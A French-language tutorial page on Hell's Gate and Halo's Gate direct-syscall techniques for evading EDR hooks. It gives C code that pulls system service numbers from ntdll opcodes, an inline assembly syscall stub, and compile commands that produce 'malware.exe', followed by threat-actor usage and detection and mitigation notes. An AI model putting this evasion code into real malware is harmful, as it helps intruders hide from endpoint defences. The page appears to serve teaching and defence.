# Syscalls Directs - Hell's Gate & Halo's Gate

Techniques avancées de bypass EDR par syscalls directs. Hell's Gate extrait dynamiquement les SSN (System Service Numbers) depuis ntdll.dll, permettant d'invoquer le kernel sans passer par les API hookées en userland.

⚠️ AVERTISSEMENT STRICT : Techniques de malware development avancées. Usage éducatif uniquement. Tests sur VM isolées. Usage malveillant = PRISON.

```c
// Hell's Gate - Extraction du SSN dynamique
DWORD get_ssn(const char* func_name) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    BYTE* func = (BYTE*)GetProcAddress(ntdll, func_name);

    // Parser les opcodes : mov r10, rcx; mov eax, SSN
    if (func[0] == 0x4C && func[1] == 0x8B && func[2] == 0xD1) {
        if (func[3] == 0xB8) {
            return *(DWORD*)(func + 4);  // SSN à offset +4
        }
    }
    return 0;
}

// Syscall direct en ASM inline
asm volatile(
    "mov r10, rcx\n"
    "mov eax, %0\n"    // SSN dans eax
    "syscall\n"
    :: "r"(ssn)
);
```

## Compilation

**Windows (MinGW-w64)** :
```bash
gcc example.c -o malware.exe -masm=intel -m64
```

**MSVC** :
```bash
ml64 /c syscall.asm
cl example.c syscall.obj /Fe:malware.exe
```

## Concepts clés

- **Hell's Gate** : Extraction dynamique des SSN en parsant les opcodes de ntdll.dll en mémoire
- **Halo's Gate** : Détection de hooks inline et reconstruction du SSN via fonctions voisines
- **Syscall instruction** : Instruction CPU x64 pour transition directe userland -> kernel
- **SSN (System Service Number)** : Identifiant unique de chaque fonction kernel (varie selon build Windows)
- **Hook userland bypass** : Contourner les hooks EDR placés dans ntdll/kernel32
- **NTAPI vs Win32** : Appels natifs NT (NtAllocateVirtualMemory) vs API Win32 (VirtualAlloc)
- **Stub parsing** : Analyse des premiers bytes pour identifier hooks (JMP/CALL/MOV)

## Techniques utilisées par

- **Cobalt Strike** : Syscall direct pour injection stealthée, bypass hooks Defender/CrowdStrike
- **Metasploit** : Module windows/local/bypassuac_injection_winsxs utilise syscalls directs
- **APT29 (Cozy Bear)** : SolarWinds malware utilisait syscalls directs pour éviter détection
- **Lazarus Group** : Framework MATA emploie Hell's Gate pour allocation mémoire RWX
- **BumbleBee loader** : Halo's Gate pour détecter et contourner hooks EDR modernes

## Détection et Mitigation

**Indicateurs de détection** :
- Syscalls provenant d'adresses non-ntdll.dll (Return Address Spoofing detection)
- Patching ETW via NtTraceControl pour désactiver telemetry
- Accès direct à ntdll.dll depuis disk pour lire SSN (fichier vs mémoire)
- Séquence syscall inhabituelle (ex: NtAllocateVirtualMemory + NtCreateThreadEx)

**Mitigations EDR modernes** :
- Kernel callbacks (ObRegisterCallbacks) pour monitor allocations RWX
- ETW monitoring (Event ID 10: ProcessAccess) pour opérations suspectes
- Stack walking pour détecter frames non-légitimes
- Driver EDR en kernel-mode pour intercepter syscalls directement
- Microsoft Vulnerable Driver Blocklist contre BYOVD (Bring Your Own Vulnerable Driver)
